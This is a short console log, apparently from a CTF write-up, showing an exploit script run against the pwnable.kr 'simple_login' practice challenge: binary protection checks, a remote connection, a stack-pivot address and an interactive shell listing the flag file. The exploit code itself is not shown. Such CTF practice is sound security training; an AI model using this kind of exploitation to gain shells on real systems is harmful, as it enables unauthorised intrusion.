```console
orkinyo@ubuntu:~/ctfs/my_writeups/pwnable.kr/Rookies/simple_login$ ./expl.py 
[*] '/home/orkinyo/ctfs/my_writeups/pwnable.kr/Rookies/simple_login/login'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwnable.kr on port 9003: Done
new_ebp = 0x811eb40
[*] Switching to interactive mode
Authenticate : hash : 05ff12b1af2dbf9f726572b462a5797e
$ id
uid=1037(simplelogin) gid=1037(simplelogin) groups=1037(simplelogin)
$ ls
flag
log
simplelogin
super.pl
$  

```
